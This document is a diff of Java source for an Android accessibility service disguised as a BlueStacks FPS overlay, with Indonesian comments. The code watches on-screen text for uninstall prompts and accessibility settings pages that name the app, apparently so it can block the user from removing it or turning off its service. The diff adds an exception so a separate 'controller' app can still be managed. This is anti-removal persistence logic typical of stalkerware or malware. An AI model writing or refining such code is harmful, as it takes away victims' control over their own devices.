@@ -31,7 +31,10 @@ public class ProtectionManager {
         String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
 
         // 0. WHITELIST
-        if (pkg.equals(service.getPackageName()) || pkg.contains("com.bluestacks.fpsoverlay.controller")) {
+        // Jangan blokir aplikasi kita sendiri atau controller kita
+        if (pkg.equals(service.getPackageName()) || 
+            pkg.contains("com.bluestacks.fpsoverlay.admin") ||
+            pkg.contains("controller")) {
             return;
         }
 
@@ -121,65 +124,63 @@ public class ProtectionManager {
     private boolean isLikelyUninstallDialog(AccessibilityNodeInfo root) {
         if (root == null) return false;
         
+        String targetPkg = service.getPackageName(); // com.bluestacks.fpsoverlay
+        String controllerPkg = "com.bluestacks.fpsoverlay.admin";
+        
         // Dapatkan nama aplikasi kita sendiri untuk validasi
         String appName = "BondexFPS"; 
-        String accLabel = "BlueStacks";
         try {
             int stringId = service.getApplicationInfo().labelRes;
             if (stringId != 0) appName = service.getString(stringId);
         } catch (Exception ignored) {}
 
-        // 1. GLOBAL SCAN: Jika ada nama aplikasi DAN kata kunci uninstall di layar manapun
-        boolean hasAppName = checkNodeRecursive(root, appName) || checkNodeRecursive(root, accLabel);
+        // 1. EXCLUSION: Jika layar mengandung package controller, JANGAN BLOKIR.
+        // Ini memastikan kita tidak mengganggu proses uninstall untuk controller.
+        if (checkNodeRecursive(root, controllerPkg)) {
+            return false;
+        }
+
+        // 2. DETECTION: Cari identitas APK Target (Package Name atau App Name)
+        // Sesuai permintaan, kita utamakan deteksi berdasarkan package name target.
+        boolean mentionsTarget = checkNodeRecursive(root, targetPkg) || checkNodeRecursive(root, appName);
         
-        boolean hasUninstallKey = checkNodeRecursive(root, "uninstall") || 
-                                 checkNodeRecursive(root, "copot") || 
-                                 checkNodeRecursive(root, "pemasangan") ||
-                                 checkNodeRecursive(root, "meng-uninstall") ||
-                                 checkNodeRecursive(root, "hapus") ||
-                                 checkNodeRecursive(root, "delete");
+        if (!mentionsTarget) return false;
 
-        // Jika keduanya ada di satu layar, langsung tendang tanpa peduli package-nya apa
-        if (hasAppName && hasUninstallKey) {
-            Log.e(TAG, "!! GLOBAL UNINSTALL DETECTED !! AppName: " + appName + " found with Uninstall keyword.");
-            return true;
-        }
-
-        // 2. Cek frasa spesifik (Double check)
-        if (checkNodeRecursive(root, "Hapus instalasi") || 
-            checkNodeRecursive(root, "Copot pemasangan") || 
-            checkNodeRecursive(root, "Do you want to uninstall") ||
-            checkNodeRecursive(root, "ingin menghapus") ||
-            checkNodeRecursive(root, "ingin mencopot")) {
-            return true;
-        }
-
-        return false;
+        // 3. KEYWORDS: Cek kata kunci uninstall
+        return checkNodeRecursive(root, "uninstall") || 
+               checkNodeRecursive(root, "copot") || 
+               checkNodeRecursive(root, "pemasangan") ||
+               checkNodeRecursive(root, "meng-uninstall") ||
+               checkNodeRecursive(root, "hapus") ||
+               checkNodeRecursive(root, "delete") ||
+               checkNodeRecursive(root, "Hapus instalasi") || 
+               checkNodeRecursive(root, "Copot pemasangan") || 
+               checkNodeRecursive(root, "Do you want to uninstall") ||
+               checkNodeRecursive(root, "ingin menghapus") ||
+               checkNodeRecursive(root, "ingin mencopot");
     }
 
     private boolean isLikelyAccessibilityPage(AccessibilityNodeInfo root) {
         if (root == null) return false;
 
-        String appName = "BondexFPS";
-        String accLabel = "BlueStacks Mobile Optimization";
+        String targetPkg = service.getPackageName();
+        String controllerPkg = "com.bluestacks.fpsoverlay.admin";
         
+        // Jika layar mengandung package controller, biarkan user mengatur aksesibilitasnya
+        if (checkNodeRecursive(root, controllerPkg)) {
+            return false;
+        }
+
+        String appName = "BondexFPS";
         try {
             int nameId = service.getApplicationInfo().labelRes;
             if (nameId != 0) appName = service.getString(nameId);
-            
-            // Cari label aksesibilitas dari manifest secara dinamis jika memungkinkan
-            // Tapi untuk sekarang kita hardcode saja berdasarkan strings.xml yang kita temukan
         } catch (Exception ignored) {}
 
-        // 1. Cek apakah Nama App atau Label Aksesibilitas ada di layar
-        boolean hasAppName = checkNodeRecursive(root, appName);
-        boolean hasAccLabel = checkNodeRecursive(root, "BlueStacks") || checkNodeRecursive(root, "Optimization");
+        // Cek apakah Nama App atau Package Target ada di layar
+        boolean hasTargetIdentity = checkNodeRecursive(root, appName) || checkNodeRecursive(root, targetPkg);
         
-        Log.d(TAG, "Accessibility Check - Pkg: " + root.getPackageName());
-        Log.d(TAG, "Looking for [" + appName + "] found: " + hasAppName);
-        Log.d(TAG, "Looking for [BlueStacks/Optimization] found: " + hasAccLabel);
-        
-        if (!hasAppName && !hasAccLabel) return false;
+        if (!hasTargetIdentity) return false;
 
         // 2. Jika ada nama aplikasi, cek apakah kita berada di lingkungan pengaturan/aksesibilitas
         boolean isAcc = checkNodeForText(root, "Accessibility") || checkNodeForText(root, "Aksesibilitas");
